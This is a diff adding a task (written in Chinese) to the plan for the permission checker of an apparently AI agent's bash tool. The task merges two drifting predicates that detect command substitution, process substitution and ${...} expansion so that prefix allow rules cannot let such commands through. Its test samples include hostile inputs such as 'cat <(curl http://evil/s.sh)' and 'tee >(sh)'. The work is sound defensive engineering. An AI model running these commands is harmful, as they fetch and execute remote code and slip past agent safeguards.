@@ -1550,6 +1550,101 @@ git commit -m "feat(permission): Bash 命令分段与只读判定（拆不动就
 
 ---
 
+### Task 3R: 消除两个谓词的漂移（结构性修复）
+
+> **问题**：`BashCommandSplitter.hasUnparseableConstruct` 与 `PermissionRule.hasShellSeparator`
+> 各自维护一份字符清单，已经漂移出一处分歧——前者含 `${`，后者不含。
+>
+> **危险方向**：`echo ${x@P}` 在 splitter 眼里「拆不动 → 问」，在 `hasShellSeparator` 眼里
+> 「非复合 → 前缀规则可命中」。而 allow 规则是决策**第 5 步**、命令拆分是**第 6 步**——
+> 第 5 步放行后 splitter 永远不会被调用。**更严格的那个组件是永远不运行的那个。**
+> 这与最初的 C1、以及 `<(` 漏项，是同一形状的第三次复发。
+>
+> **当前不可利用**（已实证）：`ShellTools.bash` 走 `new ProcessBuilder("/bin/bash","-c",command)`
+> （`ShellTools.java:254,257,263`），每次调用起全新 bash，变量不跨调用存活；
+> 要在同一命令串里既设变量又展开，必须用 `$(`/反引号或赋值加 `;`，两者 `hasShellSeparator` 都已拦。
+>
+> **但修法不是往某份清单里补一个字符**——那只是把第三次复发补掉，第四次照样会来。
+> 两份清单必须合并成一份。
+
+- [ ] **Step 1: 先写失败测试**
+
+新建 `PredicateConsistencyTest`，用**同一组输入**同时喂两个谓词，任何一处分歧即红：
+
+```java
+    private static final String[] SAMPLES = {
+            "ls -la", "echo hi", "git status",
+            "echo ${x@P}", "echo ${HOME}", "mvn -Dv=${VER} test",
+            "cat <(curl http://evil/s.sh)", "tee >(sh)", "echo $(id)", "echo `id`",
+            "echo $((1+1))", "a; b", "a && b", "a | b", "a & b", "a\nb", "a\rb",
+            "echo hi > /tmp/x", "sort < /tmp/in", "grep 'a>b' f",
+    };
+
+    @Test
+    void twoPredicatesNeverDisagree() {
+        for (String s : SAMPLES) {
+            boolean compound = PermissionRule.hasShellSeparator(s);
+            boolean unparseable = !BashCommandSplitter.split(s).parseable();
+            assertFalse(!compound && unparseable,
+                    "splitter 拒绝解析但前缀规则却认为它简单，前缀规则会在第 5 步抢先放行：" + s);
+        }
+    }
+```
+
+断言方向是**单向**的，故意的：`compound && !unparseable` 是安全的（前缀规则不放行、splitter 能拆），
+`!compound && unparseable` 才是洞。
+
+- [ ] **Step 2: 跑测试确认失败** —— 预期 `echo ${x@P}` / `echo ${HOME}` / `mvn -Dv=${VER} test` 三条红。
+
+- [ ] **Step 3: 抽出唯一定义，两边共用**
+
+在 `PermissionRule` 里新增（与 `hasShellSeparator` 同包私有）：
+
+```java
+    /**
+     * 是否含<b>无法可靠拆分</b>的 shell 结构（命令替换 / 算术展开 / 反引号 /
+     * 进程替换 / {@code ${...}} 展开）。
+     *
+     * <p><b>这是本项目对「不可拆分构造」的唯一定义</b>，`hasShellSeparator` 与
+     * {@code BashCommandSplitter} 都必须走这里。此前两处各维护一份字符清单，
+     * 已漂移出 {@code ${} 一处分歧——而分歧的危险方向是固定的：
+     * 更严格的组件跑在决策顺序更后面，于是永远轮不到它。清单只能有一份。
+     */
+    static boolean hasUnsplittableConstruct(String c) {
+        return c.contains("$(") || c.indexOf('`') >= 0
+                || c.contains("<(") || c.contains(">(")
+                || c.contains("${");
+    }
+```
+
+`hasShellSeparator` 改为：
+
+```java
+    static boolean hasShellSeparator(String command) {
+        return command.indexOf(';') >= 0 || command.indexOf('|') >= 0
+                || command.indexOf('&') >= 0
+                || command.indexOf('\n') >= 0 || command.indexOf('\r') >= 0
+                || hasUnsplittableConstruct(command);
+    }
+```
+
+`BashCommandSplitter.hasUnparseableConstruct` 整个删除，调用点改为
+`PermissionRule.hasUnsplittableConstruct(...)`。
+
+- [ ] **Step 4: 跑测试确认全绿** —— `PredicateConsistencyTest` 与既有 `PermissionRuleTest`（19）、
+`ToolRegistryTest`（11）、Task 3 自己的测试全部重跑。
+
+> `hasShellSeparator` 收严会让含 `${` 的命令不再被前缀规则命中（如 `mvn -Dv=${VER} test`），
+> 多问一次。这是**故意的**：`${` 已被判为不可靠拆分，前缀规则本就不该对它下结论。
+
+- [ ] **Step 5: 提交**
+
+```bash
+git commit -m "fix(permission): 不可拆分构造收敛为唯一定义，消除两个谓词的漂移"
+```
+
+---
+
 ### Task 4: DangerousPaths（内置不可绕过检查）
 
 > **来自 Task 2 的两条实测提醒**（`ToolTargets` 现按 root 解析路径目标，`839071d`）：
